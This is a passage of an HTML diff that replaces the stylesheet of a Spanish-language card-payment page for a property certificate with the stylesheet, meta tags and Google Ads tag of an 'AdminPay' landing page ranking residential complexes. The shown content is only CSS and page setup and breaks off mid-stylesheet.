@@ -1,1639 +1,1858 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-    <meta charset="utf-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-    <title>Pago Seguro — Certificado de Tradición y Libertad</title>
-    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" />
-    <style>
-        :root {
-            --co-blue: #2c5697;
-            --co-blue-hover: #214272;
-            --co-blue-tint: #eaf0f8;
-            --co-yellow: #f6c915;
-            --co-red: #c1121f;
-            --co-green: #059669;
-            --co-teal: #0f9b8f;
-            --co-text: #111827;
-            --co-text-2: #374151;
-            --co-text-muted: #6b7280;
-            --co-bg: #fff;
-            --co-input-bg: #f3f4f6;
-            --co-border: #e5e7eb;
-        }
-
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-        }
-
-        html, body {
-            font-family: 'Inter', system-ui, -apple-system, sans-serif;
-            background-color: var(--co-bg);
-            color: var(--co-text);
-        }
-
-        body {
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
-
-        header {
-            padding: 16px 0;
-            background: var(--co-bg);
-        }
-
-        .header-container {
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 0 24px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            gap: 16px;
-        }
-
-        .logo {
-            display: flex;
-            align-items: center;
-            text-decoration: none;
-        }
-
-        .logo svg {
-            height: 44px;
-            width: auto;
-        }
-
-        .progress-info {
-            display: flex;
-            align-items: center;
-            gap: 10px;
-        }
-
-        .progress-bar-container {
-            width: 120px;
-            height: 6px;
-            background: var(--co-border);
-            border-radius: 3px;
-            overflow: hidden;
-        }
-
-        .progress-bar-fill {
-            height: 100%;
-            background: var(--co-blue);
-            width: 100%;
-            transition: width 0.3s ease;
-        }
-
-        .progress-text {
-            font-size: 14px;
-            color: var(--co-text);
-            white-space: nowrap;
-        }
-
-        .header-stripe {
-            display: flex;
-            height: 3px;
-            margin-top: 16px;
-        }
-
-        .stripe-1 { flex: 2; background-color: var(--co-yellow); }
-        .stripe-2 { flex: 1; background-color: var(--co-blue); }
-        .stripe-3 { flex: 1; background-color: var(--co-red); }
-
-        main {
-            flex: 1;
-            max-width: 1200px;
-            margin: 0 auto;
-            padding: 24px;
-            width: 100%;
-            overflow-x: hidden;
-        }
-
-        .content-wrapper {
-            display: flex;
-            gap: 32px;
-            justify-content: flex-start;
-        }
-
-        aside {
-            width: 220px;
-            flex-shrink: 0;
-        }
-
-        .progress-list {
-            list-style: none;
-        }
-
-        .progress-item {
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            padding: 12px 0;
-            border-bottom: 1px solid var(--co-border);
-        }
-
-        .progress-item:last-child {
-            border-bottom: none;
-        }
-
-        .progress-number {
-            width: 28px;
-            height: 28px;
-            background: var(--co-border);
-            color: var(--co-text-2);
-            border-radius: 50%;
-            flex-shrink: 0;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            font-size: 0.875rem;
-            font-weight: 600;
-        }
-
-        .progress-number.active,
-        .progress-number.completed {
-            background: var(--co-blue);
-            color: #fff;
-        }
-
-        .progress-number.completed::before {
-            content: "✓";
-        }
-
-        .progress-title {
-            display: flex;
-            flex-direction: column;
-            gap: 4px;
-        }
-
-        .progress-title span:first-child {
-            font-size: 14px;
-            font-weight: 600;
-            color: var(--co-text);
-        }
-
-        .progress-item:not(.active) .progress-title span:first-child {
-            color: var(--co-text-muted);
-            font-weight: 400;
-        }
-
-        .badge {
-            display: inline-block;
-            border-radius: 2px;
-            padding: 2px 8px;
-            font-size: 0.75rem;
-            font-weight: 600;
-        }
-
-        .badge.info {
-            background: var(--co-blue-tint);
-            color: var(--co-blue);
-        }
-
-        .badge.neutral {
-            background: var(--co-input-bg);
-            color: var(--co-text-muted);
-        }
-
-        .form-container {
-            flex: 1;
-            max-width: 640px;
-            min-width: 0;
-        }
-
-        .form-header {
-            margin-bottom: 20px;
-        }
-
-        .form-header h1 {
-            font-size: 1.375rem;
-            font-weight: 700;
-            color: var(--co-text);
-            margin: 0 0 8px 0;
-        }
-
-        .form-header p {
-            font-size: 0.9375rem;
-            color: var(--co-text-2);
-            line-height: 1.55;
-            margin: 0;
-        }
-
-        form {
-            background: transparent;
-        }
-
-        .form-section {
-            display: flex;
-            flex-direction: column;
-            gap: 32px;
-        }
-
-        .form-group {
-            display: flex;
-            flex-direction: column;
-            gap: 8px;
-            margin-bottom: 20px;
-        }
-
-        .form-label {
-            color: var(--co-text);
-            font-size: 0.875rem;
-            font-weight: 600;
-            display: block;
-            margin-bottom: 6px;
-        }
-
-        .kern-input,
-        .kern-select {
-            background-color: var(--co-input-bg);
-            border: none;
-            border-bottom: 2px solid var(--co-text-2);
-            height: 48px;
-            color: var(--co-text);
-            width: 100%;
-            padding: 8px 12px;
-            font-family: 'Inter', system-ui, sans-serif;
-            font-size: 1rem;
-            transition: border-color 0.15s;
-            outline: none;
-        }
-
-        .kern-input::placeholder {
-            color: var(--co-text-muted);
-        }
-
-        .kern-input:hover,
-        .kern-select:hover {
-            border-bottom-color: var(--co-text);
-        }
-
-        .kern-input:focus,
-        .kern-select:focus {
-            border-bottom: 3px solid var(--co-blue);
-            padding-bottom: 7px;
-        }
-
-        .kern-input:disabled {
-            opacity: 0.7;
-            cursor: not-allowed;
-        }
-
-        .kern-select {
-            appearance: none;
-            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='16' height='16' viewBox='0 0 24 24' fill='none' stroke='%23374151' stroke-width='2'%3E%3Cpolyline points='6 9 12 15 18 9'%3E%3C/polyline%3E%3C/svg%3E");
-            background-position: right 12px center;
-            background-repeat: no-repeat;
-            padding-right: 40px;
-        }
-
-        .resumen-box {
-            background: #f9fafb;
-            border: 1px solid var(--co-border);
-            padding: 20px;
-            margin-bottom: 24px;
-        }
-
-        .resumen-title {
-            font-size: 0.75rem;
-            font-weight: 600;
-            color: var(--co-text-muted);
-            text-transform: uppercase;
-            margin-bottom: 16px;
-            letter-spacing: 0.5px;
-        }
-
-        .resumen-item {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: 12px 0;
-            border-bottom: 1px solid var(--co-border);
-        }
-
-        .resumen-item:last-child {
-            border-bottom: none;
-            font-weight: 700;
-            font-size: 1rem;
-            padding-top: 16px;
-            color: var(--co-text);
-        }
-
-        .resumen-label {
-            font-size: 0.9375rem;
-            color: var(--co-text-2);
-        }
-
-        .resumen-value {
-            font-size: 0.9375rem;
-            color: var(--co-text-2);
-            font-weight: 500;
-        }
-
-        .resumen-item:last-child .resumen-value {
-            font-weight: 700;
-        }
-
-        .resumen-datos {
-            margin-top: 12px;
-            padding-top: 12px;
-            border-top: 1px dashed var(--co-border);
-        }
-
-        .resumen-datos .resumen-item {
-            padding: 8px 0;
-            border-bottom: none;
-            font-size: 0.875rem;
-        }
-
-        .resumen-datos .resumen-label {
-            font-weight: 400;
-            color: var(--co-text-muted);
-        }
-
-        .payment-section {
-            border: 1px solid var(--co-border);
-            padding: 24px;
-            margin-bottom: 24px;
-            background: #fafbfc;
-        }
-
-        .payment-header {
-            display: flex;
-            align-items: flex-start;
-            gap: 12px;
-            margin-bottom: 24px;
-            padding-bottom: 20px;
-            border-bottom: 1px solid var(--co-border);
-        }
-
-        .payment-header svg {
-            width: 20px;
-            height: 20px;
-            color: var(--co-blue);
-            flex-shrink: 0;
-            margin-top: 2px;
-        }
-
-        .payment-info {
-            flex: 1;
-        }
-
-        .payment-title {
-            font-size: 0.9375rem;
-            font-weight: 600;
-            color: var(--co-text);
-            margin-bottom: 2px;
-        }
-
-        .payment-subtitle {
-            font-size: 0.8125rem;
-            color: var(--co-text-muted);
-        }
-
-        .payment-logos {
-            display: flex;
-            gap: 10px;
-            align-items: center;
-        }
-
-        .payment-logos img {
-            height: 28px;
-            width: auto;
-            object-fit: contain;
-        }
-
-        .card-input-wrapper {
-            position: relative;
-            margin-bottom: 16px;
-        }
-
-        .card-logo {
-            position: absolute;
-            right: 12px;
-            top: 50%;
-            transform: translateY(-50%);
-            width: 32px;
-            height: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            pointer-events: none;
-        }
-
-        .card-logo img {
-            max-width: 100%;
-            max-height: 100%;
-            object-fit: contain;
-        }
-
-        .card-input-wrapper .kern-input {
-            padding-right: 48px;
-        }
-
-        .expiry-cvc-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 24px;
-            margin-bottom: 24px;
-        }
-
-        .expiry-cvc-grid .form-group {
-            margin-bottom: 0;
-        }
-
-        .expiry-cvc-grid .form-label {
-            font-size: 0.875rem;
-            margin-bottom: 6px;
-        }
-
-        .banco-group {
-            margin-bottom: 24px;
-        }
-
-        .banco-group .form-label {
-            font-size: 0.875rem;
-            margin-bottom: 6px;
-        }
-
-        .security-footer {
-            display: flex;
-            align-items: center;
-            gap: 8px;
-            font-size: 0.8125rem;
-            color: var(--co-text-muted);
-            margin-bottom: 24px;
-            padding: 16px 0;
-            border-top: 1px solid var(--co-border);
-        }
-
-        .security-footer svg {
-            width: 16px;
-            height: 16px;
-            color: var(--co-blue);
-            flex-shrink: 0;
-        }
-
-        /* ============================================ */
-        /* LOADING OVERLAY - SIMPLE COMO LA IMAGEN     */
-        /* ============================================ */
-        .loading-overlay {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(255, 255, 255, 0.60);
-            backdrop-filter: blur(3px);
-            -webkit-backdrop-filter: blur(3px);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-            flex-direction: column;
-            padding: 20px;
-        }
-
-        .loading-overlay.active {
-            display: flex;
-        }
-
-        .loading-card {
-            background: #ffffff;
-            border-radius: 16px;
-            padding: 40px 32px 32px 32px;
-            max-width: 360px;
-            width: 100%;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
-            text-align: center;
-            animation: slideUp 0.4s ease-out;
-            margin: auto;
-            border: 1px solid #f0f0f0;
-        }
-
-        @keyframes slideUp {
-            from {
-                opacity: 0;
-                transform: translateY(20px) scale(0.96);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0) scale(1);
-            }
-        }
-
-        /* Logo de la tarjeta - GRANDE y centrado */
-        .logo-container {
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin-bottom: 24px;
-            min-height: 100px;
-        }
-
-        .logo-container .logo-img {
-            height: 80px;
-            width: auto;
-            max-width: 150px;
-            object-fit: contain;
-        }
-
-        /* Texto - estilo simple */
-        .loading-card .loading-text {
-            font-size: 0.95rem;
-            font-weight: 500;
-            color: var(--co-text-2);
-            margin-bottom: 20px;
-            letter-spacing: 0.2px;
-        }
-
-        /* Barra de progreso - DELGADA */
-        .progress-bar-wrapper {
-            width: 100%;
-        }
-
-        .progress-bar-track {
-            width: 100%;
-            height: 4px;
-            background: #e5e7eb;
-            border-radius: 4px;
-            overflow: hidden;
-            position: relative;
-        }
-
-        .progress-bar-fill-loading {
-            height: 100%;
-            background: var(--co-blue);
-            border-radius: 4px;
-            width: 0%;
-            transition: width 0.3s ease;
-            position: relative;
-        }
-
-        .progress-bar-fill-loading::after {
-            content: '';
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.4), transparent);
-            animation: shimmer 1.5s infinite;
-        }
-
-        @keyframes shimmer {
-            0% { transform: translateX(-100%); }
-            100% { transform: translateX(100%); }
-        }
-
-        /* Spinner inicial */
-        .loading-card .initial-spinner {
-            display: none;
-            width: 48px;
-            height: 48px;
-            border: 3px solid var(--co-border);
-            border-top: 3px solid var(--co-blue);
-            border-radius: 50%;
-            animation: spin 0.8s linear infinite;
-            margin: 0 auto 20px auto;
-        }
-
-        .loading-card .initial-spinner.active {
-            display: block;
-        }
-
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-
-        /* ============================================ */
-
-        .status-message {
-            display: none;
-            padding: 16px;
-            border-radius: 8px;
-            margin-bottom: 20px;
-            font-weight: 500;
-            text-align: center;
-        }
-
-        .status-message.error {
-            display: block;
-            background: #fef2f2;
-            border: 1px solid #fecaca;
-            color: #dc2626;
-        }
-
-        .status-message.success {
-            display: block;
-            background: #f0fdf4;
-            border: 1px solid #bbf7d0;
-            color: #16a34a;
-        }
-
-        .status-message.info {
-            display: block;
-            background: #e0f2fe;
-            border: 1px solid #bae6fd;
-            color: #0369a1;
-        }
-
-        .btn {
-            height: 48px;
-            padding: 0 24px;
-            font-family: 'Inter', system-ui, sans-serif;
-            font-size: 1rem;
-            font-weight: 600;
-            border-radius: 4px;
-            border: none;
-            cursor: pointer;
-            display: inline-flex;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            transition: background-color 0.15s;
-            width: 100%;
-            text-align: center;
-        }
-
-        .btn-primary {
-            background-color: var(--co-blue);
-            color: #fff;
-        }
-
-        .btn-primary:hover {
-            background-color: var(--co-blue-hover);
-        }
-
-        .btn-primary:disabled {
-            background-color: var(--co-border);
-            cursor: not-allowed;
-        }
-
-        .disclaimer {
-            font-size: 0.8125rem;
-            color: var(--co-text-muted);
-            line-height: 1.6;
-            margin-top: 20px;
-            padding-top: 20px;
-        }
-
-        .disclaimer a {
-            color: var(--co-blue);
-            text-decoration: none;
-        }
-
-        .disclaimer a:hover {
-            text-decoration: underline;
-        }
-
-        footer {
-            border-top: 1px solid var(--co-border);
-            padding: 16px 24px;
-            text-align: center;
-            margin-top: 60px;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 24px;
-            flex-wrap: wrap;
-            margin-bottom: 8px;
-        }
-
-        .footer-links a {
-            font-size: 0.75rem;
-            color: var(--co-text-muted);
-            text-decoration: none;
-        }
-
-        .footer-text {
-            font-size: 0.75rem;
-            color: var(--co-text-muted);
-            margin: 0 0 12px;
-        }
-
-        .footer-disclaimer {
-            font-size: 0.75rem;
-            color: var(--co-text-muted);
-            max-width: 720px;
-            margin: 0 auto;
-            line-height: 1.5;
-        }
-
-        .error-message {
-            color: var(--co-red);
-            font-size: 0.75rem;
-            margin-top: 4px;
-            display: none;
-        }
-
-        .form-group.error .kern-input,
-        .form-group.error .kern-select {
-            border-bottom-color: var(--co-red);
-        }
-
-        .form-group.error .error-message {
-            display: block;
-        }
-
-        /* ============================================ */
-        /* RESPONSIVE - CENTRADO EN MÓVIL               */
-        /* ============================================ */
-        @media (max-width: 768px) {
-            .content-wrapper {
-                flex-direction: column;
-                gap: 24px;
-            }
-            aside { display: none; }
-            .form-container { max-width: 100%; }
-            main { padding: 16px; }
-            .form-header h1 { font-size: 1.25rem; }
-            .btn { width: 100%; }
-            .expiry-cvc-grid { grid-template-columns: 1fr 1fr; }
-            
-            .loading-card {
-                padding: 32px 24px 28px 24px;
-                max-width: 330px;
-                margin: auto;
-            }
-            .logo-container .logo-img { height: 70px; max-width: 130px; }
-            .loading-card .loading-text { font-size: 0.9rem; }
-        }
-
-        @media (max-width: 480px) {
-            .form-header h1 { font-size: 1.125rem; }
-            .form-header p { font-size: 0.875rem; }
-            .expiry-cvc-grid { grid-template-columns: 1fr; gap: 16px; }
-            
-            .loading-card {
-                padding: 28px 20px 24px 20px;
-                max-width: 300px;
-                margin: auto;
-            }
-            .logo-container .logo-img { height: 60px; max-width: 110px; }
-            .loading-card .loading-text { font-size: 0.85rem; }
-        }
-
-        @media (max-width: 360px) {
-            .loading-card {
-                padding: 24px 16px 20px 16px;
-                max-width: 270px;
-                margin: auto;
-            }
-            .logo-container .logo-img { height: 50px; max-width: 90px; }
-            .loading-card .loading-text { font-size: 0.8rem; }
-        }
-    </style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>AdminPay – Mejores Conjuntos Residenciales con Pago Online de Administración</title>
+  <meta name="description" content="Ranking de conjuntos residenciales con sistemas de pago de administración online seguro, rápido y fácil. Compara plataformas y encuentra dónde vivir con pagos digitales.">
+  <!-- Google tag (gtag.js) -->
+  <script async src="https://www.googletagmanager.com/gtag/js?id=AW-18395681577"></script>
+  <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'AW-18395681577');
+  </script>
+  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600;700;800&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+:root{
+  --primary:#0052CC;
+  --accent:#0052CC;
+  --success:#0066CC;
+  --dark:#003D99;
+  --light:#F5F7FA;
+  --border:#D9E1F2;
+  --text:#1A202C;
+  --muted:#5A6C7D;
+  --white:#FAFBFC;
+}
+
+html{scroll-behavior:smooth}
+body{
+  font-family:'Inter',sans-serif;
+  background:#FFFFFF;
+  color:var(--text);
+  overflow-x:hidden;
+}
+
+/* ===== NAV ===== */
+nav{
+  position:fixed;
+  top:0;left:0;right:0;
+  z-index:200;
+  display:flex;
+  align-items:center;
+  justify-content:space-between;
+  padding:1.1rem 3rem;
+  background:rgba(250,251,252,.96);
+  backdrop-filter:blur(12px);
+  border-bottom:1px solid var(--border);
+  transition:all .3s ease;
+}
+
+nav.scrolled{
+  background:rgba(250,251,252,.99);
+  box-shadow:0 8px 24px rgba(0,0,0,.05);
+}
+
+.logo{
+  font-family:'Poppins',sans-serif;
+  font-size:1.3rem;
+  font-weight:800;
+  background:linear-gradient(135deg,var(--primary),var(--accent));
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+  display:flex;
+  align-items:center;
+  gap:.5rem;
+}
+
+.logo-emoji{font-size:1.5rem;animation:pulse 2s ease-in-out infinite}
+@keyframes pulse{0%,100%{transform:scale(1)}50%{transform:scale(1.1)}}
+
+.nav-menu{
+  display:flex;
+  gap:2.5rem;
+  list-style:none;
+}
+
+.nav-menu a{
+  font-size:.9rem;
+  font-weight:500;
+  color:var(--text);
+  text-decoration:none;
+  transition:color .2s;
+  position:relative;
+}
+
+.nav-menu a:hover{color:var(--primary)}
+.nav-menu a::after{
+  content:'';
+  position:absolute;
+  bottom:-6px;left:0;
+  width:0;height:2px;
+  background:var(--primary);
+  transition:width .3s;
+}
+.nav-menu a:hover::after{width:100%}
+
+.nav-cta{
+  background:linear-gradient(135deg,var(--primary),var(--accent));
+  color:#fff;
+  border:none;
+  padding:.75rem 1.8rem;
+  border-radius:50px;
+  font-size:.9rem;
+  font-weight:600;
+  cursor:pointer;
+  transition:all .3s;
+  font-family:'Inter',sans-serif;
+}
+
+.nav-cta:hover{
+  transform:translateY(-3px);
+  box-shadow:0 12px 30px rgba(0,82,204,.25);
+}
+
+.nav-toggle{
+  display:none;
+  flex-direction:column;
+  gap:5px;
+  background:none;
+  border:none;
+  cursor:pointer;
+}
+
+.nav-toggle span{
+  width:24px;height:2px;
+  background:var(--text);
+  border-radius:2px;
+  transition:all .3s;
+}
+
+.nav-toggle.open span:nth-child(1){transform:rotate(45deg) translateY(10px)}
+.nav-toggle.open span:nth-child(2){opacity:0}
+.nav-toggle.open span:nth-child(3){transform:rotate(-45deg) translateY(-10px)}
+
+@media(max-width:768px){
+  nav{padding:1rem 1.5rem}
+  .nav-toggle{display:flex}
+  .nav-menu{
+    position:absolute;
+    top:100%;left:0;right:0;
+    background:#fff;
+    flex-direction:column;
+    gap:0;
+    max-height:0;
+    overflow:hidden;
+    border-bottom:1px solid var(--border);
+    transition:max-height .3s;
+  }
+  .nav-menu.open{max-height:400px}
+  .nav-menu li{border-top:1px solid var(--border)}
+  .nav-menu a{display:block;padding:1rem}
+  .nav-cta{display:none}
+}
+
+/* ===== HERO ===== */
+#hero{
+  min-height:100vh;
+  display:grid;
+  grid-template-columns:1fr 1fr;
+  align-items:center;
+  gap:4rem;
+  padding:8rem 5vw 5rem;
+  background:linear-gradient(135deg,#FAFBFC 0%,#F5F7FA 100%);
+  position:relative;
+  overflow:hidden;
+}
+
+@media(max-width:768px){#hero{grid-template-columns:1fr;padding-top:7rem;gap:2rem}}
+
+#hero::before{
+  content:'';
+  position:absolute;
+  top:-150px;right:-100px;
+  width:450px;height:450px;
+  background:radial-gradient(circle,rgba(0,82,204,.08),transparent 70%);
+  border-radius:50%;
+  animation:float 8s ease-in-out infinite;
+}
+
+#hero::after{
+  content:'';
+  position:absolute;
+  bottom:-100px;left:-80px;
+  width:350px;height:350px;
+  background:radial-gradient(circle,rgba(0,82,204,.05),transparent 70%);
+  border-radius:50%;
+  animation:float 10s ease-in-out infinite;
+  animation-direction:reverse;
+}
+
+@keyframes float{
+  0%,100%{transform:translateY(0)}
+  50%{transform:translateY(30px)}
+}
+
+.hero-badge{
+  display:inline-flex;
+  align-items:center;
+  gap:.6rem;
+  background:rgba(37,99,235,.1);
+  border:1px solid rgba(37,99,235,.2);
+  color:var(--primary);
+  border-radius:50px;
+  padding:.55rem 1.3rem;
+  font-size:.8rem;
+  font-weight:600;
+  letter-spacing:.04em;
+  text-transform:uppercase;
+  margin-bottom:1.6rem;
+  animation:slideUp .6s ease .1s both;
+}
+
+h1.hero-title{
+  font-family:'Poppins',sans-serif;
+  font-size:clamp(2.2rem,5.5vw,4.8rem);
+  font-weight:800;
+  color:var(--dark);
+  line-height:1.1;
+  letter-spacing:-.01em;
+  animation:slideUp .6s ease .2s both;
+}
+
+h1.hero-title em{
+  font-style:normal;
+  background:linear-gradient(135deg,var(--primary),var(--accent));
+  -webkit-background-clip:text;
+  -webkit-text-fill-color:transparent;
+  background-clip:text;
+}
+
+.hero-desc{
+  margin-top:1.3rem;
+  font-size:1.05rem;
+  color:var(--muted);
+  line-height:1.8;
+  max-width:480px;
+  animation:slideUp .6s ease .3s both;
+}
+
+.hero-actions{
+  margin-top:2.3rem;
+  display:flex;
+  gap:1rem;
+  flex-wrap:wrap;
+  animation:slideUp .6s ease .4s both;
+}
+
+.btn-primary{
+  background:linear-gradient(135deg,var(--primary),var(--accent));
+  color:#fff;
+  border:none;
+  padding:.95rem 2.2rem;
+  border-radius:50px;
+  font-size:.95rem;
+  font-weight:600;
+  cursor:pointer;
+  transition:all .3s;
+  font-family:'Inter',sans-serif;
+}
+
+.btn-primary:hover{
+  transform:translateY(-4px);
+  box-shadow:0 16px 40px rgba(0,82,204,.25);
+}
+
+.btn-secondary{
+  background:#fff;
+  color:var(--primary);
+  border:2px solid var(--primary);
+  padding:.9rem 2rem;
+  border-radius:50px;
+  font-size:.95rem;
+  font-weight:600;
+  cursor:pointer;
+  transition:all .3s;
+  font-family:'Inter',sans-serif;
+}
+
+.btn-secondary:hover{
+  background:var(--primary);
+  color:#fff;
+}
+
+@keyframes slideUp{
+  from{opacity:0;transform:translateY(20px)}
+  to{opacity:1;transform:translateY(0)}
+}
+
+.hero-visual{
+  position:relative;
+  display:grid;
+  gap:1.6rem;
+  animation:slideUp .8s ease .3s both;
+}
+
+.card-insight{
+  background:#fff;
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:1.8rem;
+  backdrop-filter:blur(8px);
+  transition:all .3s;
+}
+
+.card-insight:hover{
+  border-color:var(--primary);
+  box-shadow:0 16px 40px rgba(0,82,204,.12);
+  transform:translateY(-6px);
+}
+
+.insight-top{
+  display:flex;
+  align-items:center;
+  gap:1rem;
+  margin-bottom:1.2rem;
+}
+
+.insight-icon{
+  width:50px;height:50px;
+  border-radius:12px;
+  background:rgba(37,99,235,.1);
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:1.6rem;
+}
+
+.insight-label{
+  font-family:'Poppins',sans-serif;
+  font-size:1rem;
+  font-weight:700;
+  color:var(--text);
+}
+
+.insight-sub{
+  font-size:.8rem;
+  color:var(--muted);
+}
+
+.insight-value{
+  font-family:'Poppins',sans-serif;
+  font-size:2.2rem;
+  font-weight:800;
+  color:var(--primary);
+  margin-top:.8rem;
+}
+
+.insight-bar{
+  width:100%;height:6px;
+  background:var(--border);
+  border-radius:10px;
+  overflow:hidden;
+  margin-top:1rem;
+}
+
+.insight-fill{
+  height:100%;
+  border-radius:10px;
+  background:linear-gradient(90deg,var(--primary),var(--accent));
+  animation:fillBar 2s ease forwards;
+}
+
+@keyframes fillBar{
+  from{width:0}to{width:var(--fill)}
+}
+
+/* ===== STATS ===== */
+#stats{
+  background:linear-gradient(135deg,#0052CC,#0066CC);
+  padding:5rem 5vw;
+  text-align:center;
+  color:#fff;
+}
+
+.stats-grid{
+  max-width:1200px;
+  margin:0 auto;
+  display:grid;
+  grid-template-columns:repeat(auto-fit,minmax(200px,1fr));
+  gap:2.5rem;
+}
+
+.stat-item{
+  animation:popUp .6s ease forwards;
+  opacity:0;
+}
+
+.stat-item:nth-child(1){animation-delay:.1s}
+.stat-item:nth-child(2){animation-delay:.2s}
+.stat-item:nth-child(3){animation-delay:.3s}
+.stat-item:nth-child(4){animation-delay:.4s}
+
+@keyframes popUp{
+  from{opacity:0;transform:scale(.9)}to{opacity:1;transform:scale(1)}
+}
+
+.stat-number{
+  font-family:'Poppins',sans-serif;
+  font-size:3rem;
+  font-weight:800;
+  margin-bottom:.5rem;
+}
+
+.stat-label{
+  font-size:.95rem;
+  opacity:.95;
+}
+
+/* ===== RANKING ===== */
+#ranking{
+  padding:8rem 5vw;
+  background:#fff;
+}
+
+.section-header{
+  max-width:1200px;
+  margin:0 auto 4rem;
+}
+
+.section-tag{
+  font-size:.8rem;
+  font-weight:700;
+  letter-spacing:.15em;
+  text-transform:uppercase;
+  color:var(--primary);
+  display:flex;
+  align-items:center;
+  gap:.6rem;
+  margin-bottom:1rem;
+}
+
+.section-tag::before{
+  content:'';
+  width:24px;height:2px;
+  background:var(--primary);
+}
+
+h2.section-title{
+  font-family:'Poppins',sans-serif;
+  font-size:clamp(2rem,3.5vw,3.4rem);
+  font-weight:800;
+  color:var(--dark);
+  line-height:1.1;
+  margin-bottom:1rem;
+}
+
+h2.section-title em{
+  font-style:normal;
+  color:var(--primary);
+}
+
+.section-desc{
+  font-size:1rem;
+  color:var(--muted);
+  line-height:1.7;
+  max-width:800px;
+}
+
+.ranking-list{
+  max-width:1200px;
+  margin:0 auto;
+  display:flex;
+  flex-direction:column;
+  gap:1.6rem;
+}
+
+.ranking-card{
+  background:#fff;
+  border:1px solid var(--border);
+  border-radius:16px;
+  padding:2.2rem;
+  display:grid;
+  grid-template-columns:80px 1fr auto;
+  gap:2rem;
+  align-items:center;
+  transition:all .3s;
+  opacity:0;
+  animation:slideInLeft .5s ease forwards;
+}
+
+.ranking-card:nth-child(1){animation-delay:0s}
+.ranking-card:nth-child(2){animation-delay:.1s}
+.ranking-card:nth-child(3){animation-delay:.2s}
+.ranking-card:nth-child(4){animation-delay:.3s}
+.ranking-card:nth-child(5){animation-delay:.4s}
+.ranking-card:nth-child(6){animation-delay:.5s}
+
+@keyframes slideInLeft{
+  from{opacity:0;transform:translateX(-30px)}
+  to{opacity:1;transform:translateX(0)}
+}
+
+.ranking-card:hover{
+  border-color:var(--primary);
+  box-shadow:0 16px 40px rgba(0,82,204,.12);
+  transform:translateY(-4px);
+}
+
+.rank-badge{
+  width:80px;height:80px;
+  border-radius:14px;
+  display:flex;
+  flex-direction:column;
+  align-items:center;
+  justify-content:center;
+  font-weight:800;
+  font-size:2rem;
+  color:#fff;
+}
+
+.rank-badge.first{background:linear-gradient(135deg,#FFD700,#FFC700);box-shadow:0 8px 20px rgba(255,215,0,.25)}
+.rank-badge.second{background:linear-gradient(135deg,#C0C0C0,#A8A8A8);box-shadow:0 8px 20px rgba(192,192,192,.25)}
+.rank-badge.third{background:linear-gradient(135deg,#CD7F32,#B8860B);box-shadow:0 8px 20px rgba(205,127,66,.25)}
+.rank-badge.other{background:linear-gradient(135deg,var(--primary),var(--accent));box-shadow:0 8px 20px rgba(37,99,235,.2)}
+
+.rank-content h3{
+  font-family:'Poppins',sans-serif;
+  font-size:1.3rem;
+  font-weight:800;
+  color:var(--dark);
+  margin-bottom:.4rem;
+}
+
+.rank-location{
+  font-size:.9rem;
+  color:var(--muted);
+  margin-bottom:1rem;
+}
+
+.rank-tags{
+  display:flex;
+  gap:.6rem;
+  margin-bottom:1rem;
+  flex-wrap:wrap;
+}
+
+.tag{
+  background:rgba(37,99,235,.08);
+  color:var(--primary);
+  padding:.35rem 1rem;
+  border-radius:50px;
+  font-size:.8rem;
+  font-weight:600;
+}
+
+.rank-desc{
+  font-size:.95rem;
+  color:var(--muted);
+  line-height:1.6;
+  margin-bottom:1rem;
+}
+
+.rank-metrics{
+  display:flex;
+  gap:2rem;
+  flex-wrap:wrap;
+  font-size:.9rem;
+}
+
+.metric{
+  display:flex;
+  flex-direction:column;
+}
+
+.metric-label{
+  color:var(--muted);
+  font-size:.8rem;
+}
+
+.metric-value{
+  font-family:'Poppins',sans-serif;
+  font-weight:700;
+  color:var(--dark);
+  margin-top:.2rem;
+}
+
+.rank-actions{
+  display:flex;
+  gap:.8rem;
+}
+
+.btn-small{
+  background:transparent;
+  border:1px solid var(--border);
+  padding:.6rem 1.2rem;
+  border-radius:8px;
+  font-size:.8rem;
+  font-weight:600;
+  cursor:pointer;
+  transition:all .2s;
+  color:var(--text);
+}
+
+.btn-small:hover{
+  border-color:var(--primary);
+  background:rgba(37,99,235,.05);
+  color:var(--primary);
+}
+
+@media(max-width:768px){
+  .ranking-card{
+    grid-template-columns:1fr;
+    gap:1.2rem;
+  }
+  .rank-actions{display:none}
+}
+
+/* ===== PAGOS ===== */
+#pagos{
+  padding:8rem 5vw;
+  background:#FAFBFC;
+}
+
+.payment-grid{
+  max-width:1200px;
